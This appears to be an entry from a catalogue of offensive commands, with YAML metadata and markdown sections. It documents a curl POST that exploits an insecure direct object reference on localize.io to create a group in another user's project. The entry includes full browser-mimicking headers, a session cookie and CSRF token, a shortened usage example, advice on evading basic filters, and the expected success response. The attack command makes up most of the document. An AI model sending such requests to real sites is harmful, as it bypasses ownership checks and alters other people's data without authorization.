---
data: >-
  curl -X POST "http://www.localize.io/pages/create_project/8h" -H "User-Agent:
  Mozilla/5.0 (Windows NT 6.2; rv:28.0) Gecko/20100101 Firefox/28.0" -H "Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H
  "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate" -H
  "Referer: http://www.localize.io/pages/create_project/82" -H "Cookie:
  PHPSESSID=srdrqpfu6k679bna6e2rtrsrq7" -H "Connection: keep-alive" -H
  "Content-Type: application/x-www-form-urlencoded" -d
  "CSRFToken=NTc4NTUxMjY1MzUxZTllOGIwYWM4MC4yMjE1MjUxNw%3D%3D&addGroup%5Bname%5D=Test"
tags:
  - http
  - post
  - idor
  - web-exploit
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:44.722Z'
id: aaa0de56-beb4-479c-a2be-7b231ab8fee7
verified: false
validated: true
submitted: true
---
# modified-idor-group-creation-request

## Command

```bash
curl -X POST "http://www.localize.io/pages/create_project/8h" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:28.0) Gecko/20100101 Firefox/28.0" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Accept-Encoding: gzip, deflate" \
  -H "Referer: http://www.localize.io/pages/create_project/82" \
  -H "Cookie: PHPSESSID=srdrqpfu6k679bna6e2rtrsrq7" \
  -H "Connection: keep-alive" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "CSRFToken=NTc4NTUxMjY1MzUxZTllOGIwYWM4MC4yMjE1MjUxNw%3D%3D&addGroup%5Bname%5D=Test"
```

## Description

This command exploits IDOR by sending an HTTP POST request to create a group in a foreign project (ID '8h') using credentials for a different user. The project_id is modified from a legitimate request, bypassing server-side ownership checks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `URL path` | Endpoint with target project ID (e.g., /pages/create_project/8h) | Yes |
| `-H User-Agent` | Mimics browser user agent | Yes |
| `-H Cookie` | Session cookie from authenticated user | Yes |
| `-d CSRFToken` | Valid anti-CSRF token from legitimate session | Yes |
| `-d addGroup[name]` | Name of the unauthorized group (e.g., 'Test') | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "http://www.localize.io/pages/create_project/8h" -H "Cookie: PHPSESSID=your_session" -d "CSRFToken=your_token&addGroup[name]=Test" -H "Content-Type: application/x-www-form-urlencoded"
```

### Advanced Usage

Use full headers to replicate browser traffic, ensuring the request evades basic filters.

## Expected Output

HTTP 200 OK response indicating successful group creation in the foreign project, despite lack of permissions. Verify by accessing the project page to see the new group.

## Related

- [[commands/original-group-creation-request]]
- [[procedures/Exploit-IDOR-for-Unauthorized-Group-Creation]]
